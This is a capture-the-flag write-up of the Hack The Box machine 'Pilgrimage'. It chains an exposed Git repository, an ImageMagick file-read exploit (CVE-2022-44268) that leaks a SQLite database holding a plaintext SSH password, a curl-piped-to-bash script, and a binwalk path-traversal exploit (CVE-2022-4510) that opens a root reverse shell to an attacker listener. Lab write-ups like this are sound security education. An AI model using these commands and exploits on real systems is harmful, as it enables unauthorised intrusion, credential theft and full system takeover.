---
title: HTB - Pilgrimage
date: 2024-01-18
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, monitored, nmap, cve-2022-44268, cve-2022-4510, binwalk, sqlite, imagemagick, magick, git, incursore, git-dumper]
img_path: /assets/htb/fullpwn/pilgrimage/
published: true
image:
    path: machine_info.png
---

## Overview

[Pilgrimage](https://app.hackthebox.com/machines/Pilgrimage) is an easy-difficulty Linux machine featuring a web application with an exposed `Git` repository. 

**Initial foothold**: Analysing the underlying filesystem and source code reveals the use of a vulnerable version of `ImageMagick`, which can be used to read arbitrary files on the target by embedding a malicious `tEXT` chunk into a PNG image ([CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268)). The vulnerability is leveraged to obtain a `SQLite` database file containing a plaintext password that can be used to SSH into the machine. 

**Privilege escalation**: Enumeration of the running processes reveals a `Bash` script executed by `root` that calls a vulnerable version of the `Binwalk` binary. By creating another malicious PNG, `CVE-2022-4510` is leveraged to obtain Remote Code Execution (RCE) as `root`.

## Info gathering

Let's start with a port-scanning:

```bash
sudo incursore.sh -H 10.10.11.219 --type All
```

[`incursore`](https://github.com/wirzka/incursore) produces a lot of output, but it neatly organized them into files and directories for us:

```bash
$ tree 10.10.11.219/
10.10.11.219/
├── incursore_10.10.11.219_All.txt
├── nmap
│   ├── CVEs_10.10.11.219.nmap
│   ├── full_TCP_10.10.11.219.nmap
│   ├── Recon_10.10.11.219.nmap
│   ├── Script_TCP_10.10.11.219.nmap
│   ├── UDP_10.10.11.219.nmap
│   └── Vulns_10.10.11.219.nmap
└── recon
    ├── ffuf_10.10.11.219_80.txt
    └── screenshot_http_10.10.11.219_80.jpeg

3 directories, 9 files
```

After going through them all, we don't have much more than the port-scan results from `nmap`:

```bash
# open TCP ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have:
- An SSH server, but we will need valid credentials to use that.
- A `nginx/1.18.0` webserver which redirects to `pilgrimage.htb`, so we should add this domain to our local `/etc/hosts` file. 

```bash
$ cat /etc/hosts | grep pi
10.10.11.219    pilgrimage.htb
```

Now we added the domain on our local DNS file, we can run an `nmap` scan on just port `80` again, as it will be able to run more scripts on it:

```bash
$ nmap -sC -sV --min-rate 10000 -T4 -p 80 10.10.11.219

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
```

It seems that the webserver has a **public-facing Git repository**! We have seen a similar case before, in the [Git Happens](https://cspanias.github.io/posts/THM-Git-Happens/) room from Try Hack Me, and we have also honed our Git-related skills while working on the [Bandit](https://cspanias.github.io/posts/OverTheWire-Bandit-(21-33)/#level-27--28) wargame!

Before moving forward, let's visit the site through our browser to see what it looks like:

![](home.png)

It seems like an app where we can upload our images and have it shrank, nothing fancy here!

## Initial foothold

Let's start with a dir-busting before start enumerating the `/.git` directory:

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://pilgrimage.htb/FU
ZZ

<SNIP>

.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 38ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 38ms]
.git/index              [Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 38ms]
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 36ms]
.git/logs/              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 30ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 34ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 30ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 30ms]
:: Progress: [4723/4723] :: Job [1/1] :: 1369 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Not much there; let's start enumerating the repo by first cloning it using [`git-dumper`](https://github.com/arthaud/git-dumper):

```bash
# cloning the repository
$ git-dumper http://pilgrimage.htb/.git/ git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
<SNIP>

[-] Running git checkout .
```

We can quickly check what's included in the repo:

```bash
$ tree git
git
├── assets
│   ├── bulletproof.php
│   ├── css
│   │   ├── animate.css
│   │   ├── custom.css
│   │   ├── flex-slider.css
│   │   ├── fontawesome.css
│   │   ├── owl.css
│   │   └── templatemo-woox-travel.css
│   ├── images
│   │   ├── banner-04.jpg
│   │   └── cta-bg.jpg
│   ├── js
│   │   ├── custom.js
│   │   ├── isotope.js
│   │   ├── isotope.min.js
│   │   ├── owl-carousel.js
│   │   ├── popup.js
│   │   └── tabs.js
│   └── webfonts
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff2
│       ├── fa-v4compatibility.ttf
│       └── fa-v4compatibility.woff2
├── dashboard.php
├── index.php
├── login.php
├── logout.php
├── magick
├── register.php
└── vendor
    ├── bootstrap
    │   ├── css
    │   │   └── bootstrap.min.css
    │   └── js
    │       └── bootstrap.min.js
    └── jquery
        ├── jquery.js
        ├── jquery.min.js
        ├── jquery.min.map
        ├── jquery.slim.js
        ├── jquery.slim.min.js
        └── jquery.slim.min.map

11 directories, 37 files
```

We know by now, that **commits** might include some interesting info, so let's search for them and write the output into a file:

```bash
git log | grep commit | cut -d " " -f2 | xargs git show > commits
# check line count
$ wc -l commits
50109 commits
```

> _For an analysis of the above command see [here](https://cspanias.github.io/posts/THM-Git-Happens/#33-git-repositories-and-gittools)._

After searching for things of interest in our `commits` file, nothing pops up. Exploring the different scripts, we can see that the site's functionality, i.e., how it uploads and shrinks the images, is defined within the `index.php` file:

![](index_source.png)

What's of interest here, is that we can see that the `magick` binary is used, which is also inside the `git` repo:

```bash
$ ls
assets  commits  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

We can check the executable's version as follows:

```bash
$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

This version is of `1999`, 25 years old! Let's check if there is a known vulnerability we could exploit:

![](google_search_magick.png)

An **information disclosure** vulnerability exists, [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268), with various PoCs, such as [this](https://github.com/kljunowsky/CVE-2022-44268) one. Let's try to use it:

```bash
# clone the repo
$ sudo git clone https://github.com/kljunowsky/CVE-2022-44268
Cloning into 'CVE-2022-44268'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 27 (delta 8), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (27/27), 7.32 KiB | 2.44 MiB/s, done.
Resolving deltas: 100% (8/8), done.
$ cd CVE-2022-44268/
$ ls
CVE-2022-44268.py  Dockerfile  README.md  requirements.txt
# give executable permissions to the python script
$ sudo chmod +x CVE-2022-44268.py
```

We can now download a random image, poison it, and then upload it:

```bash
$ sudo python3 CVE-2022-44268.py --image ../dog.jpeg --file-to-read /etc/passwd --output poisoned_dog.jpeg
```

![](uploaded_image.png)

Next, we can check if the exploit was successful:

```bash
$ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/65a91a1ec4c4c.png
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Success! We can now create a user list and grep just the accounts that have a shell:

```bash
$ sudo python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/65a91a1ec4c4c.png > ../users

$ cat ../users | grep sh$
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
```

As it seems, there are just 2 users: `root` and `emily`. By further enumerating the files, we can discover that the app uses `sqlite` and the path, `/var/db/pilgrimage` is shown:

![](login_source.png)

We can try using the exploit to exfiltrate the database instead of the `passwd` file:

```bash
$ sudo python3 CVE-2022-44268.py --image ../dog.jpeg --file-to-read /var/db/pilgrimage --output poisoned_dog.jpeg

$ sudo python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/65a91ec973fd8.png > ../pilg.db
Traceback (most recent call last):
  File "/home/kali/htb/fullpwn/pilgrimage/CVE-2022-44268/CVE-2022-44268.py", line 48, in <module>
    main()
  File "/home/kali/htb/fullpwn/pilgrimage/CVE-2022-44268/CVE-2022-44268.py", line 17, in main
    decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x91 in position 99: invalid start byte
```

The above process does not work. However, we can copy the uploaded image's link and download it using `wget`:

![](copy_image_link.png)

```bash
$ wget http://pilgrimage.htb/shrunk/65a921159fba8.png
--2024-01-18 13:01:23--  http://pilgrimage.htb/shrunk/65a921159fba8.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22406 (22K) [image/png]
Saving to: ‘65a921159fba8.png’

65a921159fba8.png              100%[====================================================>]  21.88K  --.-KB/s    in 0.03s

2024-01-18 13:01:23 (710 KB/s) - ‘65a921159fba8.png’ saved [22406/22406]
```

We can now use [`identify`](https://linux.die.net/man/1/identify) to check the format and characteristics of the image:

```bash
$ identify -verbose 65a921159fba8.png
Image: 65a921159fba8.png
  Format: PNG (Portable Network Graphics)
  Geometry: 113x112
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                  3084.00 (0.0471)
      Maximum:                 65535.00 (1.0000)
      Mean:                    41631.40 (0.6353)
      Standard Deviation:       8755.28 (0.1336)
    Green:
      Minimum:                  1542.00 (0.0235)
      Maximum:                 65535.00 (1.0000)
      Mean:                    42209.65 (0.6441)
      Standard Deviation:       8565.39 (0.1307)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 62194.00 (0.9490)
      Mean:                    26394.08 (0.4027)
      Standard Deviation:       8025.44 (0.1225)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 21.9Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 113x112+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type:

   20480
53514c69746520666f726d61742033001000010100402020000000420000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000042002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
<SNIP>

  Date:create: 2024-01-18T13:01:09+00:00
  Date:modify: 2024-01-18T13:01:09+00:00
  Date:timestamp: 2024-01-18T13:01:09+00:00
  Signature: 4c4e6cde6dfedcc48bbde899e372a4e200ce2381e14a6cc9887013771a56254f
  Tainted: False
  User Time: 0.010u
  Elapsed Time: 0m:0.001498s
  Pixels Per Second: 8.1Mi
```

Next, we can copy the file's **hex content** in another file, then use [`xxd`](https://linux.die.net/man/1/xxd) to read it without line number information and without a particular column layout, and finally, write the output to a new `.db` file:

```bash
$ cat pilgrimage | xxd -r -p > pilgrimage.db
```

Now, we can use `sqlite3` to open the database and dump its contents:

```bash
$ sqlite3 pilgrimage.db
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
INSERT INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;
sqlite>
```

And voila! We have `emily`'s credentials: `emily:abigchonkyboi123`. Let's check if we use them to log into the SSH server:

```bash
$ ssh emily@10.10.11.219
<SNIP>
emily@pilgrimage:~$ cat user.txt
881bcf0005970070b17e544e9b225e2e
```

And we are in!

## Privilege escalation

After exploring some directories, we could not find any direct privilege escalation paths, such as binaries we can run with `sudo` or `SUID` files. We can check the kernel version with [`uname`](https://man7.org/linux/man-pages/man1/uname.1.html) and see if there is anything we can do with that:

```bash
emily@pilgrimage:/tmp$ uname -v
#1 SMP Debian 5.10.179-1 (2023-05-12)
```

Upon searching for known vulnerabilities, we find [this](https://www.hackers-arise.com/post/privilege-escalation-the-dirty-pipe-exploit-to-escalate-privileges-on-linux-systems) post which has a tool that checks for [CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847). Let's try that:

```bash
$ sudo git clone https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker
Cloning into 'CVE-2022-0847-dirty-pipe-checker'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 24 (delta 7), reused 4 (delta 2), pack-reused 0
Receiving objects: 100% (24/24), 5.29 KiB | 5.29 MiB/s, done.
Resolving deltas: 100% (7/7), done.

$ cd CVE-2022-0847-dirty-pipe-checker/
$ ls
dpipe.sh  README.md  test.sh
# give execute permissions on the scripts
$ sudo chmod +x dpipe.sh test.sh
# launch an HTTP server so the target can reach the scripts
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

First, we have to run the `dpipe.sh` script on the target for checking if the kernel is vulnerable:

```bash
emily@pilgrimage:/tmp$ curl http://10.10.14.15:8888/dpipe.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   840  100   840    0     0  15555      0 --:--:-- --:--:-- --:--:-- 15555
5 10 0
Vulnerable
```

It seems that the kernel is vulnerable! Unfortunately, after trying both exploits, none worked; we will need to find another way to escalate our privileges. Back to `emily`'s home directory, there is a hidden file called `.config`:

```bash
emily@pilgrimage:~$ ls -la
total 36
drwxr-xr-x 4 emily emily 4096 Jun  8  2023 .
drwxr-xr-x 3 root  root  4096 Jun  8  2023 ..
lrwxrwxrwx 1 emily emily    9 Feb 10  2023 .bash_history -> /dev/null
-rw-r--r-- 1 emily emily  220 Feb 10  2023 .bash_logout
-rw-r--r-- 1 emily emily 3526 Feb 10  2023 .bashrc
drwxr-xr-x 3 emily emily 4096 Jun  8  2023 .config
-rw-r--r-- 1 emily emily   44 Jun  1  2023 .gitconfig
drwxr-xr-x 3 emily emily 4096 Jun  8  2023 .local
-rw-r--r-- 1 emily emily  807 Feb 10  2023 .profile
```

This contains the tool [`binwalk`](https://github.com/ReFirmLabs/binwalk) which strikes a bit odd. If we check the running processes we also see something that strikes out:

```bash
emily@pilgrimage:~$ ps -e
    PID TTY          TIME CMD
      1 ?        00:00:02 systemd
      2 ?        00:00:00 kthreadd
      3 ?        00:00:00 rcu_gp
      4 ?        00:00:00 rcu_par_gp
      6 ?        00:00:00 kworker/0:0H-events_highpri
      8 ?        00:00:00 mm_percpu_wq
      9 ?        00:00:00 rcu_tasks_rude_
     10 ?        00:00:00 rcu_tasks_trace
     11 ?        00:00:00 ksoftirqd/0
    749 ?        00:00:00 malwarescan.sh
    <SNIP>
```

There is a `malwarescan.sh` process running. We can check with what privileges it runs as follows:

```bash
emily@pilgrimage:~$ ps -ef | grep malware
root         749       1  0 Jan18 ?        00:00:00 /bin/bash /usr/sbin/malwarescan.sh
```

This process is running as `root`. Let's find out what exactly it does:

```bash
# checking script's location
emily@pilgrimage:~$ find / -type f -name malwarescan.sh 2>/dev/null
/usr/sbin/malwarescan.sh
# checking script's content
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

It appears to do some checks using `binwalk`. So we can check `binwalk`'s version to see if this is the case of another out-of-date app:

```bash
emily@pilgrimage:~$ binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
<SNIP>
```

It seems there is also a known **path traversal** vulnerability which lead to RCE: [CVE-2022-4510](https://nvd.nist.gov/vuln/detail/CVE-2022-4510) and a ready-made [PoC](https://github.com/adhikara13/CVE-2022-4510-WalkingPath)! Since, the `malwarescan.sh` runs with `root` permissions, and uses `binwalk`, if we manage to exploit `binwalk` to gain RCE, we will gain a root shell. Let's try to do that:

> More on [CVE-2022-4510](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/).

```bash
$ sudo git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
Cloning into 'CVE-2022-4510-WalkingPath'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 3), reused 7 (delta 2), pack-reused 0
Receiving objects: 100% (12/12), 7.28 KiB | 7.28 MiB/s, done.
Resolving deltas: 100% (3/3), done.

$ cd CVE-2022-4510-WalkingPath/
$ ls
LICENSE  README.md  walkingpath.py
$ sudo chmod +x walkingpath.py
```

We first need to create a `.png` file and then run the script:

```bash
$ sudo touch exploit.png
$ sudo python3 walkingpath.py reverse exploit.png 10.10.14.15 1337
$ ls -l
total 20
-rw-r--r-- 1 root root  709 Jan 18 16:04 binwalk_exploit.png
-rw-r--r-- 1 root root    0 Jan 18 16:02 exploit.png
-rw-r--r-- 1 root root 7048 Jan 18 15:40 LICENSE
-rw-r--r-- 1 root root 1569 Jan 18 15:40 README.md
-rwxr-xr-x 1 root root 3391 Jan 18 15:40 walkingpath.py
```

A new file is generated: `binwalk_exploit.png` and although it shows as a `data` file, it is really a [`PFS`](https://lekensteyn.nl/files/pfs/pfs.txt) file. We need to transfer this file to the target and then make it be used by the `malwarescan.sh` script:

```bash
$ file binwalk_exploit.png
binwalk_exploit.png: data

$ xxd binwalk_exploit.png
00000000: 5046 532f 302e 3900 0000 0000 0000 0100  PFS/0.9.........
00000010: 2e2e 2f2e 2e2f 2e2e 2f2e 636f 6e66 6967  ../../../.config
00000020: 2f62 696e 7761 6c6b 2f70 6c75 6769 6e73  /binwalk/plugins
00000030: 2f62 696e 7761 6c6b 2e70 7900 0000 0000  /binwalk.py.....
<SNIP>

$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

We need to transfer the file to `/var/www/pilgrimage.htb/shrunk/` as this is where `binwalk` picks it up in the `malwarescan.sh` script. Let's also open a listener before doing that:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

Now we can tranfer the file:

```bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.15:8888/binwalk_exploit.png
--2024-01-19 03:28:29--  http://10.10.14.15:8888/binwalk_exploit.png
Connecting to 10.10.14.15:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [image/png]
Saving to: ‘binwalk_exploit.png’

binwalk_exploit.png   100%[========================>]     709  --.-KB/s    in 0s

2024-01-19 03:28:29 (87.4 MB/s) - ‘binwalk_exploit.png’ saved [709/709]
```

If we look back on our listener:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.219] 53476
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
ac1e4331310d2b302a35d1c86cecbfd5
```

![](machine_pwned.png){: width="75%" .normal}